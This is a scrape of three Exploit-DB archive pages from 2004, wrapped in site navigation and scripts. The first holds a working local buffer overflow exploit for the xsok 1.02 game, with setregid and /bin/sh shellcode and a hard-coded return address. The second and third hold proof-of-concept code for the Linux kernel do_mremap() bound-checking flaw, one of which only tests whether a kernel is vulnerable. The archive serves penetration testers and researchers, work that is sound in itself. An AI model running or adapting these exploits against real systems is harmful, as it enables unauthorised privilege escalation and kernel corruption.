}window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDXSOK 1.02 - '-xsokdir' Local Buffer Overflow GameEDB-ID:140CVE:2004-0074EDB Verified:Author:c0wboyType:localExploit:/Platform:LinuxDate:2004-01-02Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/* 0x333xsok (2) => xsok 1.02 local game exploit**  Happy new year ! (2 :)*  coded by c0wboy**  (c) 0x333 Outsiders Security Labs / www.0x333.org**/#include <stdio.h>#include <unistd.h>#define BIN     "/usr/games/xsok"#define RETADD  0xbffffa3c#define SIZE    200unsigned char shellcode[] =/* setregid (20,20) shellcode */"\x31\xc0\x31\xdb\x31\xc9\xb3\x14\xb1\x14\xb0\x47""\xcd\x80"/* exec /bin/sh shellcode */"\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62""\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";int main (int argc, char ** argv){int i, ret = RETADD;char out[SIZE];fprintf(stdout, "\n ---   0x333xsok => xsok 1.02 local games exploit   ---\n");fprintf(stdout, "   ---       Outsiders Se(c)urity Labs 2003       ---\n\n");int *xsok = (int *)(out);for (i=0; i<SIZE-1 ; i+=4, *xsok++ = ret);memset((char *)out, 0x90, 63);memcpy((char *)out+63, shellcode, strlen(shellcode));execl (BIN, BIN, "-xsokdir", out, 0x0);}// milw0rm.com [2004-01-02]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 141
Linux Kernel 2.4.23/2.6.0 - 'do_mremap()' Bound Checking Validator (1) - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDLinux Kernel 2.4.23/2.6.0 - 'do_mremap()' Bound Checking Validator (1)EDB-ID:141CVE:2003-0985EDB Verified:Author:Christophe DevineType:localExploit:/Platform:LinuxDate:2004-01-06Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/**  EDB Note: This will just "test" the vulnerability.*   EDB Note: An exploit version can be found here ~ https://www.exploit-db.com/exploits/145/*//**  Proof-of-concept exploit code for do_mremap()**  Copyright (C) 2004  Christophe Devine and Julien Tinnes**  This program is free software; you can redistribute it and/or modify*  it under the terms of the GNU General Public License as published by*  the Free Software Foundation; either version 2 of the License, or*  (at your option) any later version.**  This program is distributed in the hope that it will be useful,*  but WITHOUT ANY WARRANTY; without even the implied warranty of*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the*  GNU General Public License for more details.**  You should have received a copy of the GNU General Public License*  along with this program; if not, write to the Free Software*  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA*/#include <asm/unistd.h>#include <sys/mman.h>#include <unistd.h>#include <errno.h>#define MREMAP_MAYMOVE  1#define MREMAP_FIXED    2#define __NR_real_mremap __NR_mremapstatic inline _syscall5( void *, real_mremap, void *, old_address,size_t, old_size, size_t, new_size,unsigned long, flags, void *, new_address );int main( void ){void *base;base = mmap( NULL, 8192, PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_ANONYMOUS, 0, 0 );real_mremap( base, 0, 0, MREMAP_MAYMOVE | MREMAP_FIXED,(void *) 0xC0000000 );fork();return( 0 );}// milw0rm.com [2004-01-06]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 142
Linux Kernel 2.4.23/2.6.0 - 'do_mremap()' Bound Checking Validator (2) - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDLinux Kernel 2.4.23/2.6.0 - 'do_mremap()' Bound Checking Validator (2)EDB-ID:142CVE:2003-0985EDB Verified:Author:Christophe DevineType:localExploit:/Platform:LinuxDate:2004-01-07Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/**  EDB Note: This will just "test" the vulnerability.*   EDB Note: An exploit version can be found here ~ https://www.exploit-db.com/exploits/145/*//** Proof of concept code for testing do_mremap() Linux kernel bug.* It is based on the code by Christophe Devine and Julien Tinnes* posted on Bugtraq mailing list on 5 Jan 2004 but it's safer since* it avoids any kernel data corruption.** The following test was done against the Linux kernel 2.6.0. Similar* results were obtained against the kernel 2.4.23 and previous ones.** buffer@mintaka:~$ gcc -o mremap_bug mremap_bug.c* buffer@mintaka:~$ ./mremap_bug** Base address : 0x60000000** 08048000-08049000 r-xp 00000000 03:03 2694       /home/buffer/mremap_bug* 08049000-0804a000 rw-p 00000000 03:03 2694       /home/buffer/mremap_bug* 40000000-40015000 r-xp 00000000 03:01 52619      /lib/ld-2.3.2.so* 40015000-40016000 rw-p 00014000 03:01 52619      /lib/ld-2.3.2.so* 40016000-40017000 rw-p 00000000 00:00 0* 40022000-40151000 r-xp 00000000 03:01 52588      /lib/libc-2.3.2.so* 40151000-40156000 rw-p 0012f000 03:01 52588      /lib/libc-2.3.2.so* 40156000-40159000 rw-p 00000000 00:00 0* 60000000-60002000 rw-p 00000000 00:00 0* bfffd000-c0000000 rwxp ffffe000 00:00 0** Remapping at 0x70000000...** 08048000-08049000 r-xp 00000000 03:03 2694       /home/buffer/mremap_bug* 08049000-0804a000 rw-p 00000000 03:03 2694       /home/buffer/mremap_bug* 40000000-40015000 r-xp 00000000 03:01 52619      /lib/ld-2.3.2.so* 40015000-40016000 rw-p 00014000 03:01 52619      /lib/ld-2.3.2.so* 40016000-40017000 rw-p 00000000 00:00 0* 40022000-40151000 r-xp 00000000 03:01 52588      /lib/libc-2.3.2.so* 40151000-40156000 rw-p 0012f000 03:01 52588      /lib/libc-2.3.2.so* 40156000-40159000 rw-p 00000000 00:00 0* 60000000-60002000 rw-p 00000000 00:00 0* 70000000-70000000 rw-p 00000000 00:00 0* bfffd000-c0000000 rwxp ffffe000 00:00 0** Report :* This kernel appears to be VULNERABLE** Segmentation fault* buffer@mintaka:~$*/#define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include <unistd.h>#include <fcntl.h>#include <sys/types.h>#include <sys/mman.h>#include <sys/stat.h>#include <asm/unistd.h>#include <errno.h>#define MREMAP_FIXED    2#define PAGESIZE 4096#define VMASIZE  (2*PAGESIZE)#define BUFSIZE  8192#define __NR_real_mremap __NR_mremapstatic inline _syscall5( void *, real_mremap, void *, old_address,size_t, old_size, size_t, new_size,unsigned long, flags, void *, new_address );#define MAPS_NO_CHECK 0#define MAPS_CHECK    1int mremap_check = 0;void maps_check(char *buf){if (strstr(buf, "70000000"))mremap_check++;}void read_maps(int fd, char *path, unsigned long flag){ssize_t  nbytes;char     buf[BUFSIZE];if (lseek(fd, 0, SEEK_SET) < 0) {fprintf(stderr, "Unable to lseek %s\n", path);return;}while ( (nbytes = read(fd, buf, BUFSIZE)) > 0) {if (flag & MAPS_CHECK)maps_check(buf);if (write(STDOUT_FILENO, buf, nbytes) != nbytes) {fprintf(stderr, "Unable to read %s\n", path);exit (1);}}}int main(int argc, char **argv){void     *base;char     path[16];pid_t    pid;int      fd;pid = getpid();sprintf(path, "/proc/%d/maps", pid);if ( !(fd = open(path, O_RDONLY))) {fprintf(stderr, "Unable to open %s\n", path);return 1;}base = mmap((void *)0x60000000, VMASIZE, PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);printf("\nBase address : 0x%x\n\n", base);read_maps(fd, path, MAPS_NO_CHECK);printf("\nRemapping at 0x70000000...\n\n");base = real_mremap(base, 0, 0, MREMAP_MAYMOVE | MREMAP_FIXED,(void *)0x70000000);read_maps(fd, path, MAPS_CHECK);printf("\nReport : \n");(mremap_check)? printf("This kernel appears to be VULNERABLE\n\n"): printf("This kernel appears to be NOT VULNERABLE\n\n");close(fd);return 0;}// milw0rm.com [2004-01-07]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPort142122232542495366697079808110210511011111311912313513914316116216438338940240641144344444544650250451351451553254855455561762363165568978378780887388890199810001040108910991100111411201194123514711521153315811589160416171723174317611812185818611900194720002022204921002103212121252181224223152375238023812401248025252640281028122947295429903000303030503052312831293181320032173306333333783389346034653500353536323690379038143817400040024070408141054111432243434434450145554592466147504848500050605061508050815093515151805247525052725308543254665554555556005655566658005803581458585900598460666070608060826101611261296379650265036660666770017002707070717080710071447210727272907426744375107547764977707777777877877879790280008001800280048008802080228023802880308080808180828088809081818300840084438445847385008585861988008812883988808888900090019002908090909091910091249200925192569443944797849788985598769900998799939999100001000110080102021020310443106161100011211114601220312221123451239712401133271370113722138381699218821188811900019810198132000020010200312011120171220032342325672260002701527700280153000030303313373240032674327643420537215377773784838292400074152344334468244808049152500005049652311527895286952986534135434554890555545555556380577725808062514TagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject 